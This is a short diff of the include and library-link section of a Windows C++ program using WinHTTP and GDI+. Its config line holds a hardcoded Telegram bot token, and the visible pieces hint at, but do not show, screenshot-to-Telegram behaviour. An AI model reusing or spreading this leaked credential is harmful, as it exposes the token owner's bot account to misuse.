@@ -1,9 +1,14 @@
 #define WIN32_LEAN_AND_MEAN
+#define STRICT
 #include <windows.h>
 #include <winhttp.h>
-#include <gdiplus.h>              // ← FIXED ORDER!
 #include <commctrl.h>
 #include <shellapi.h>
+
+// GDI+ WITHOUT problematic headers
+#include <gdiplus.h>
+#pragma comment(lib, "gdiplus.lib")
+
 #include <string>
 #include <vector>
 #include <fstream>
@@ -11,18 +16,8 @@
 #include <mutex>
 #include <chrono>
 
-#pragma comment(lib, "user32.lib")
-#pragma comment(lib, "gdi32.lib")
-#pragma comment(lib, "winhttp.lib")
-#pragma comment(lib, "gdiplus.lib")
-#pragma comment(lib, "shell32.lib")
-#pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "comctl32.lib")
-
 using namespace Gdiplus;
-
-using namespace Gdiplus;
-#pragma comment(lib, "gdiplus.lib")
+using namespace std;
 
 // Config
 const wchar_t* TELEGRAM_BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
